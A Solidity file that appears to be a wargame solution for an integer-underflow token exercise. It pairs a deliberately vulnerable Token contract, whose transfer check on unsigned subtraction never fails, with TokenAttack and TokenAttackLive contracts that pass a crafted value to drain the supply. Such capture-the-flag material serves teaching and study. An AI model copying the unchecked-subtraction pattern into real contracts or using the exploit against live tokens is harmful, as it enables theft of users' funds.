// SPDX-License-Identifier: MIT

// exercise code requires older solc to enable underflow/overflow
// hardhat.config.js already configured with appropriate version
pragma solidity >=0.6.8 <0.7.5;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}


// solution used by unit test
// see https://solidity-by-example.org/hacks/overflow/
// all 21000000 tokens belong to address that creates contract
// user given 20 tokens after contract creation
// user sends those 20 tokens to the attack contract
// creator address starts with 20999980 tokens, figured this out by
// await contract.balanceOf('') with the address from 'level'
// enable debugging to play with overflow/underflow
//import "hardhat/console.sol";

// will steal entire 21000000 initial supply to user address
contract TokenAttack {
   Token token;

  constructor(address _token) public {
    token =  Token(_token);
  }

  function attack() public {
    uint input = (20 - type(uint).max) * 1000000;
    //console.log("%i", input);
    token.transfer(msg.sender, input);
  }
}


// solution used to deploy live to testnet
pragma solidity >=0.6.8 <0.7.5;

// vulnerable contract stub with required function
contract TokenLive {
  function transfer(address _to, uint _value) public returns (bool) {}
  function balanceOf(address _owner) public view returns (uint balance) {}
}

// attack contract
contract TokenAttackLive {
  // todo: change this address to your vulnerable contract instance address
  // before deploying this file to testnet via remix
  address TOKEN_ADDRESS = 0x40f4D972e91Ab57BE6fAdE29d24367542eEe1ba9;

  TokenLive token;

  constructor() public {
    token = TokenLive(TOKEN_ADDRESS);
  }

  function attack() public {
    uint input = (20 - type(uint).max) * 1000000;
    token.transfer(msg.sender, input);
  }
}
